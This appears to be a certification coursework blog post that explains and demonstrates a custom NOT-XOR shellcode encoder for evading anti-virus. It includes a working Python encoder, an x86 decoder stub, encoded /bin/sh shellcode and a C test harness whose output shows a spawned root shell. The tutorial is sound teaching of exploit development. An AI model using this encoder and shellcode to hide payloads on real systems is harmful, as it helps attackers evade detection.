---
title: "SLAE32 0x04: Custom Encoding"
date: 2019-11-02
category: [SLAE32]
tags: [assembly, python, exploit development, encoder, linux, SLAE32]
header:
    teaser: "/assets/images/slae/encode.jpg"
---
Most often, the purpose of a shellcode encoder is to obfuscate a malicious shellcode payload in an attempt to evade anti-virus detection that may be running on the system executing the payload. Additionally, encoders can be used in an attempt to remove bad characters (e.g. null bytes) from a shellcode payload. To accomplish this, various techniques can be used to obfuscate the shellcode. Techniques include performing logical or mathematical operations on the bytes, or rearranging the order of bytes. An example of a commonly known (and very functional) encoder is Shikata Ga Nai.

Once the original shellcode is encoded, a decoder stub must be included with the payload. The decoder stub serves to decode the encoded payload back to its original functional state and to execute the decoded shellcode.

For this post, the creation of a custom shellcode encoder written in Python and the complementary assembly decoder will be explained and demonstrated. The shellcode that will be encoded is the `execve-stack` shellcode from the SLAE course materials. The command chosen for `execve-stack` is `/bin/sh`.

## Objectives
Create a shellcode encoder;
1. Create a custom encoding scheme
2. Demonstrate proof of concept using `execve-stack` as the shellcode

## Encoding Scheme
The shellcode is first encoded using the logical `NOT` operator. Following this, the `NOT` encoded shellcode is encoded once again using the `XOR` operator.

### Explanation
As the first part of the encoding process, each byte is subjected to the `NOT` logical operator. The `NOT` operation reverses the bits in an operand. For example:

```
Instruction: NOT    0110 0101
Result:             1001 1010           
```

As a result of this, it is possible that null bytes will be introduced into the encoded shellcode.  Any `0xff` bytes after a `NOT` operation will result in `0x00` because `0xff` is a the hexadecimal representation of 8 binary `1` values. Any null bytes that are introduced into the shellcode as a result of `NOT` encoding are addressed during `XOR` encoding.

Once all shellcode bytes have been encoded by the `NOT` operator, each byte is again encoded using the `XOR` operator. The `XOR` instruction is a logical bitwise operator that results in `1` if and only if (the "X" is for "exclusive") the operands are different. That is to say that if both operand bits are the same (either both `0` or both `1`), then the resultant bit will be set to `0`. For example:

```
Instruction: XOR    0110 0101  
                    1100 0110
Result:             1010 0011
```

This means that any `XOR` operation in which both operands are the same value will result in zero. 

```
Instruction: XOR    1110 0101  
                    1110 0101
Result:             0000 0000
```

Conversely, any `XOR` operation in which both operands are different will result in a non-zero value. 

Due to this property, as long as an `XOR` byte is chosen that does not exist in the `NOT` encoded shellcode (or any other shellcode, for that atter), it is guaranteed that no null bytes will exist in the resultant `XOR` encoded shellcode. 

## NX-Encoder.py
The full code for the `NOT` `XOR` encoder titled `NX-Encoder.py` is shown below. A demonstration of the encoder will follow the code.

```python
#!/usr/bin/python3
# NX-Encoder.py
# Author: Michael Norris

import random


# NOT encoder
def n_encode(bytes_obj):
    return [(~byte & 0xff) for byte in bytes_obj]


# XOR encoder
def x_encode(bytes_obj):
    return [(byte ^ xor_byte) for byte in bytes_obj]


# Finds unused byte in shellcode
def find_unused_byte(bytes_obj):
    byte_range = [i for i in range(256)]
    xor_list = [byte for byte in byte_range if byte not in bytes_obj]
    return random.choice(xor_list)


# Formats shellcode for printing
def format_shellcode(bytes_obj, hex_format=True):
    encoded = ''
    if hex_format:
        for byte in bytes_obj:
            encoded += '0x'
            encoded += '%02x,' % byte
        encoded = encoded[:-1]
    else:
        for byte in bytes_obj:
            encoded += '\\x'
            encoded += '%02x' % byte
    return encoded


# Shellcode for encoding should go here
shellcode = bytearray(b'SHELLCODE_PLACEHOLDER')

# NOT encoded shellcode
n_encoded = n_encode(shellcode)

# Unused byte for XOR value; used in nx-decoder.nasm
xor_byte = find_unused_byte(n_encoded)

# NOT-XOR encoded shellcode
nx_encoded = x_encode(n_encoded)

# Delimitter used in nx-decoder.nasm
delimiter = find_unused_byte(nx_encoded)
nx_encoded.append(delimiter)

# Formats shellcode for printing
formatted_shellcode = format_shellcode(nx_encoded)

# Prints output to terminal
print('Length: %d' % len(nx_encoded))
print('XOR Delimiter: ' + hex(delimiter))
print('XOR Byte: ' + hex(xor_byte))
print(formatted_shellcode)
```

### Encoding
To demonstrate the encoder, the `SHELLCODE_PLACEHOLDER` text from the code above is replaced with the `execve-stack` with the `/bin/sh` payload set shellcode, as shown below.

```python
shellcode = bytearray(b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
```

The result of running `NX-Encoder.py` is shown below. Note that the `XOR` byte and the `XOR` delimeter are selected randomly, so the next time `NX-Encoder.py` is run, the result will most likely be different.

```shell
root@kali:~/workspace/SLAE/# python3 NX-Encoder.py 
Length: 26
XOR Delimiter: 0x7c
XOR Byte: 0xe4
0x2a,0xdb,0x4b,0x73,0x34,0x34,0x68,0x73,0x73,0x34,0x79,0x72,0x75,0x92,0xf8,0x4b,0x92,0xf9,0x48,0x92,0xfa,0xab,0x10,0xd6,0x9b,0x7c
```

The output from `NX-Encoder.py` is formatted as hexadecimal byte values for use in `nx-decoder.nasm`, which is explained in the following section.

## Decoder
### Explanation
The purpose of a decoder stub is to first undo the encoding process, and then to execute the un-encoded shellcode. To reverse the operations performed on the shellcode by `NX-Encoder.py`, the decoder stub will `XOR` each byte, and then `NOT` each byte. The first `XOR` operand is the encoded shellcode byte and the second operand is the `XOR` byte, as given by `NX-Encoder.py`. The decoder stub follows the byte string one byte at a time performing these operations. That is to say that each byte is subjected to the `XOR` operation and then to the `NOT` operation before the decoder continues on to the next byte and repeats the operations. Once the delimeter value that is appended to the end of the encoded shellcode is reached, the decoder jumps to the unencoded shellcode, thus executing the code.

## Template: nx-decoder.nasm
The assembly instructions for `nx-decoder.nasm` are shown below. Note that some values must be replaced before the decoder will function. Specifically, the `XOR` delimiter value, the `XOR` byte value, and the encoded hexadecimal shellcode should replace the `0xDELIMITER`, `0xXOR_BYTE`, and `SHELLCODE_PLACEHOLDER` text, respectively.

```nasm
; Filename: nx-decoder.nasm
; Author:  Michael Norris

global _start

section .text
_start:
    ; jumps to call_decoder label
	jmp short call_decoder

decoder:
    ; stores shellcode in ESI
	pop esi

decode:
    cmp byte [esi], 0xDELIMITER     ; compares contents at ESI to delimiter
    jz shellcode                    ; jumps to shellcode, if ZF is set
	xor byte [esi], 0xXOR_BYTE      ; performs XOR operation on contents at ESI
    not byte [esi]                  ; performs NOT operation on contents at ESI
	inc esi                         ; increases ESI by 1
	jmp short decode                ; loops over previous instructions

call_decoder:
    ; CALL instruction pushes return memory address to stack
	call decoder
	shellcode: db SHELLCODE_PLACEHOLDER
```

### Assembly: Explanation
The `JUMP-CALL-POP` technique is used in `nx-decoder.nasm`. As such, execution within `nx-decoder.nasm` jumps around a bit. The explanation following will analyze the assembly instructions in an order that accounts for this execution flow. The assembly code will come first, followed by an explanation of its purpose.

```nasm
_start:
; jumps to call_decoder label
jmp short call_decoder
```

Directly after the `_start` label, the `JMP SHORT call_decoder` instruction is used to jump to the `call_decoder` label. The furthest short jump that is possible using a `JMP SHORT` instruction is +/- 127 bytes away.

```nasm
call_decoder:
; CALL instruction pushes encoded shellcode to stack
call decoder
shellcode: db 0x2a,0xdb,0x4b,0x73,0x34,0x34,0x68,0x73,0x73,0x34,0x79,0x72,0x75,0x92,0xf8,0x4b,0x92,0xf9,0x48,0x92,0xfa,0xab,0x10,0xd6,0x9b,0x7c
```

Once the `call_decoder` label has been jumped to, the next instruction is `CALL decoder`. The `CALL` instruction serves dual purposes. The first purpose is to branch execution to the `decoder` label and the second purpose is to `PUSH` the encoded `execve-stack` shellcode to the stack. The reason `CALL` pushes the next memory address to the stack is to preserve the memory address where execution should resume once the called function unwinds.

```nasm
decoder:
; stores shellcode in ESI
pop esi
```

With the encoded shellcode on the top of the stack and execution flow directed to the `decoder` label, the `POP ESI` instruction is used to store the encoded shellcode in the `ESI` register where it will be decoded.

```nasm
decode:
cmp byte [esi], 0x7c    ; compares contents at ESI to delimiter
jz shellcode            ; jumps to shellcode, if ZF is set
xor byte [esi], 0xe4    ; performs XOR operation on contents at ESI
not byte [esi]          ; performs NOT operation on contents at ESI
inc esi                 ; increments ESI by 1
jmp short decode        ; loops over previous instructions
```

Execution continues procedurally towards the `decode` label. A `CMP` instruction is used to compare the contents of `ESI` to the `XOR` delimiter value which in this example is `0x7c`. Recall that this delimiter byte was appended to the encoded shellcode by `NX-Encoder.py`, and that the byte does not exist anywhere else in the encoded shellcode. The purpose of the delimiter byte is to mark when the decoding process is complete. Once the delimiter byte is contained in `ESI`, the `CMP` result will return true which will set the zero flag `ZF`. Following the `CMP` instruction is the `JZ shellcode` instruction. If the zero flag `ZF` is set, then the decoding process is complete and execution jumps to the decoded `execve-stack` shellcode. 

If the `ZF` flag is not set (it will only be set once decoding is complete), then the byte value at `ESI` is `XOR` decoded by the `XOR` encoding byte (`0xe4` in this example). Immediately following this, the same byte is subjected to the `NOT` operation. Once these two operations are complete, the byte will be restored to its original value in the `execve-stack` shellcode.

Once the first encoded byte is decoded using `XOR` and `NOT` the value of the `ESI` register is incremented by one by the `INC ESI` instruction. Therefore, the second encoded shellcode byte is now contained in `ESI`. The `JMP SHORT decode` instruction is used to loop over the instructions as outlined above to decode the second encoded shellcode byte. This process will continue until the deilimter byte `0x7c` is encountered, at which point execution will jump to the fully decoded `execve-stack` shellcode!

## Demonstration: nx-decoder.nasm
The version of `nx-decoder.nasm` shown below includes the `XOR` delimiter byte, the `XOR` byte, and the encoded `execve-stack` shellcode as returned by `NX-Encoder.nasm`. This code will be used for demonstration purposes.

```nasm
; Filename: nx-decoder.nasm
; Author:  Michael Norris

global _start

section .text
_start:
	jmp short call_decoder

decoder:
	pop esi

decode:
    cmp byte [esi], 0x7c
    jz shellcode
	xor byte [esi], 0xe4
    not byte [esi]
	inc esi
	jmp short decode

call_decoder:
	call decoder
	shellcode: db 0x2a,0xdb,0x4b,0x73,0x34,0x34,0x68,0x73,0x73,0x34,0x79,0x72,0x75,0x92,0xf8,0x4b,0x92,0xf9,0x48,0x92,0xfa,0xab,0x10,0xd6,0x9b,0x7c
```

### Compiling & Examining the Assembly
The `nx-decoder.nasm` shellcode is compiled as explained in previous posts. The commands used were run on 64-bit Kali Linux. To start, the code should be assembled with `/usr/bin/nasm` as shown below. As the program is written in x86 assembly, the `elf32` file type is specified using the `-f` flag.

```shell
root@kali:~/workspace/SLAE# nasm -f elf32 nx-decoder.nasm -o nx-decoder.o
```

With the code assembled, the next step is to link the `nx-decoder.o` file with `/usr/bin/ld`. The `-m` flag specifies that the `elf_i386` emulation linker should be used.

```shell
root@kali:~/workspace/SLAE# ld -m elf_i386 nx-decoder.o -o nx-decoder
```

As `nx-decoder` has been compiled and linked, it should now be disassembled into opcodes using `/usr/bin/objdump` for further examination. Using the command shown below, the operation codes can be examined for any `NULL` characters. The output has been truncated to conserve space.

```shell
root@kali:~/workspace/SLAE# objdump -d ./nx-decoder -M intel

./nx-decoder:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       eb 0e                   jmp    8049010 <call_decoder>

08049002 <decoder>:
 8049002:       5e                      pop    esi

08049003 <decode>:
 8049003:       80 3e 7c                cmp    BYTE PTR [esi],0x7c
 8049006:       74 0d                   je     8049015 <shellcode>
 8049008:       80 36 e4                xor    BYTE PTR [esi],0xe4
 804900b:       f6 16                   not    BYTE PTR [esi]
 804900d:       46                      inc    esi
 804900e:       eb f3                   jmp    8049003 <decode>

08049010 <call_decoder>:
 8049010:       e8 ed ff ff ff          call   8049002 <decoder>
...
```

Upon confirmation of no `NULL` characters, the shellcode can be extracted using the bash one-line command outlined in previous posts. The resulting `nx-decoder` shellcode is shown below.

```shell
\xeb\x0e\x5e\x80\x3e\x7c\x74\x0d\x80\x36\xe4\xf6\x16\x46\xeb\xf3\xe8\xed\xff\xff\xff\x2a\xdb\x4b\x73\x34\x34\x68\x73\x73\x34\x79\x72\x75\x92\xf8\x4b\x92\xf9\x48\x92\xfa\xab\x10\xd6\x9b\x7c
```

### Demonstrating the Decoder
As demonstrated in previous posts, the `sc_test.c` program can be used to test the `nx-decoder` shellcode. The C program with the the shellcode from `nx-decoder` is shown below.

```c
#include <stdio.h>
#include <string.h>

/*
To compile:
gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
*/

unsigned char shellcode[] = \ 
    "\xeb\x0e\x5e\x80\x3e\x7c\x74\x0d"
    "\x80\x36\xe4\xf6\x16\x46\xeb\xf3"
    "\xe8\xed\xff\xff\xff\x2a\xdb\x4b"
    "\x73\x34\x34\x68\x73\x73\x34\x79"
    "\x72\x75\x92\xf8\x4b\x92\xf9\x48"
    "\x92\xfa\xab\x10\xd6\x9b\x7c";

int main(void)
{
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
```

The above program is compiled using the command shown below, as suggested in the commented program code.

```shell
root@kali:~/workspace/SLAE# gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
```

With the program compiled, `sc_test` can now be executed. If the decoding process is succesful, then a new shell will be spawned through the `/bin/sh` command in the `execve-stack` payload. The output of running `sc_test` is shown below.

```shell
root@kali:~/workspace/SLAE# ./sc_test
Shellcode Length: 47
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -lah | grep nx-decoder
-rwxr-xr-x  1 root root 4.6K Oct 19 11:34 nx-decoder
-rw-r--r--  1 root root  428 Oct 19 11:34 nx-decoder.nasm
-rw-r--r--  1 root root  560 Oct 19 11:34 nx-decoder.o
# 
```

This demonstrates that the encoded `execve-stack` shellcode returned from `NX-Encoder.py` was successfully decoded and executed by the `nx-decoder` shellcode!

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

